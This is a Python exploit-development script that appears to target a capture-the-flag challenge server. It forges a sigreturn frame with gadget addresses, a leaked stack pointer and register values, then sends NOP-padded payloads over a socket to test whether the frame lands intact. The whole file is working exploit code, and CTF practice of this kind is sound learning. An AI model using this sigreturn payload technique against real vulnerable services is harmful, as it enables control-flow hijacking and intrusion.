#!/usr/bin/env python3
"""Does the frame land, and where does the payload stop arriving?

P3 (rsp slot -> buf+0x180, i.e. just past the frame) came back with 0xb, a stale
stack value, while the control crashed - so the slot the kernel loads is the one at
sigcontext+0x78, but the bytes beyond the frame may never have been written.  Aim
rsp inside the frame at a planted constant: if that constant returns, the frame is
intact and only the tail past 0x178 is unreliable.
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC, LEAK = 0x401032, 0x401069, 0x401017
FRAME_AT, B, FRAME_LEN = 0x90, 0x28, 0x28 + 0xC0
CONST_A = 0x1122334455667788
LAND = 0xC0FFEE11223344


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def go(name, rsp_off, plant, plen):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        rsp_abs = buf + rsp_off
        f = bytearray(FRAME_LEN)
        struct.pack_into("<Q", f, B + 0x80, LEAK)
        struct.pack_into("<Q", f, B + 0x88, 0x246)
        struct.pack_into("<Q", f, B + 0x90, 0x33 | (0x2B << 48))
        struct.pack_into("<Q", f, B + 0x78, rsp_abs)
        for off, val in plant:
            struct.pack_into("<Q", f, off, val)
        body = bytearray(b"\x90" * plen)
        struct.pack_into("<Q", body, 0x80, G1)
        struct.pack_into("<Q", body, 0x88, SC)
        body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
        s.sendall(b"\x90" * 24 + bytes(body))
        time.sleep(0.5)
        pre = drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.5)
        got = pre + drain(s, 2.5)
        v = struct.unpack("<Q", got[:8])[0] if len(got) >= 8 else None
        print("%-24s buf=%#x rsp=%#x n=%d raw=%-16s val=%s" % (
            name, buf, rsp_abs, len(got), got[:8].hex(),
            hex(v) if v is not None else "-"))
    finally:
        s.close()
    time.sleep(0.6)


s = socket.create_connection((HOST, PORT), timeout=20)
s.close()
time.sleep(0.5)

# Q1: read a constant planted at the head of the frame itself
go("Q1 inside frame", FRAME_AT, [(0x00, CONST_A)], FRAME_AT + FRAME_LEN)
# Q2: read a constant planted just past the frame (this is what came back as 0xb)
go("Q2 past the frame", 0x180, [(0x00, CONST_A)], 0x188)
# Q3: control, read the frame head with nothing planted there
go("Q3 head untouched", FRAME_AT, [], FRAME_AT + FRAME_LEN)
